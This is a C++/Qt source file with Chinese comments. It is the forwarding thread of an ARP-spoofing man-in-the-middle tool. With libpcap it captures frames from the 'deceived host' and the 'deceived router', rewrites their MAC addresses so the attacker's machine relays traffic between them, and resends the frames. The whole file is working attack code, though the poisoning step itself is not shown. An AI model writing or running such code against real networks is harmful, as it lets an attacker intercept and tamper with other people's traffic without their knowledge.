#include "sendpktthread.h"

SendPktThread::SendPktThread()
{
    isStop=false;
}


void SendPktThread::run()
{
    qDebug()<<"转发线程ID："<<currentThreadId();
    while(isStop!=true&&(res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
       if(res==0){//读取数据包超时
           continue;
       }
       /*int len=header->len;
       for(int i=0;i<len;i++){
           qDebug()<<pkt_data[i];
       }*/
       //以太网帧的头部
       ethhdr *eheader = (ethhdr * )pkt_data;
       //如果以太网帧的源mac地址是被欺骗主机的mac地址，则将目的mac地址改为网关mac地址
       if(memcmp(eheader->src,targetMac ,6)==0)
       {
           //memcpy (modifyMac, gateMac,6);
           modifyMac=gateMac;
           emit info( "modify the packet to gate! " );
       }
       //如果以太网帧的源mac地址是被欺骗的路由器的mac地址，则将目的mac地址改为被欺骗主机的mac地址
       else if(memcmp(eheader->src, gateMac,6)==0)
       {
           //memcpy (modifyMac,targetMac,6);
           modifyMac=targetMac;
           emit info( "modify the packet to target! ");
       }
       else{
           continue;
       }

       memcpy ((u_char *) pkt_data,modifyMac,6);
       memcpy ( (u_char *) pkt_data + 6, currentMac,6);
       pcap_sendpacket(adhandle,(const u_char * )pkt_data,header->caplen);
       sleep(1);
    }
}


void SendPktThread::setflag(bool flag){
    isStop=flag;
}

void SendPktThread::MacIp(u_char *curmac,u_char *targetmac,u_char *gatemac,u_char *targetip,u_char *gateip){
    currentMac=curmac;
    targetMac=targetmac;
    gateMac=gatemac;
    targetIp=targetip;
    gateIp=gateip;
    //qDebug("本机mac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",currentMac[0],currentMac[1],currentMac[2],currentMac[3],currentMac[4],currentMac[5]);
    //qDebug("targetmac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",targetMac[0],targetMac[1],targetMac[2],targetMac[3],targetMac[4],targetMac[5]);
    //qDebug("gatemac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",gateMac[0],gateMac[1],gateMac[2],gateMac[3],gateMac[4],gateMac[5]);
    //qDebug("targetip(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",targetIp[0],targetIp[1],targetIp[2],targetIp[3],targetIp[4],targetIp[5]);
    //qDebug("gateip(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",gateIp[0],gateIp[1],gateIp[2],gateIp[3],gateIp[4],gateIp[5]);
}

